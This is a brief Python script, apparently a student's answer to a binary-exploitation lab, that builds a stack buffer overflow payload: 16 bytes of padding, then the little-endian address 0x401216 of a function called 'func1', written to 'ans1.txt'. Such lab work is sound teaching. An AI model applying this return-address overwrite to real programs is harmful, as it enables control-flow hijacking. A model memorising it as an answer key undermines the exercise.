import struct

# 栈缓冲区分析 (Stack Buffer Analysis)
# func 函数中的缓冲区位于 rbp-0x8
# return address 位于 rbp+0x8
# 偏移量 calculation:
# buffer (8 bytes) + saved rbp (8 bytes) = 16 bytes

padding = b'A' * 16

# 目标地址 (Target Address)
# func1 的地址是 0x401216
# 需要将其转换为小端格式 (Little-Endian)
target_address = struct.pack('<Q', 0x401216)

payload = padding + target_address

with open('ans1.txt', 'wb') as f:
    f.write(payload)

print("ans1.txt (payload) has been generated.")
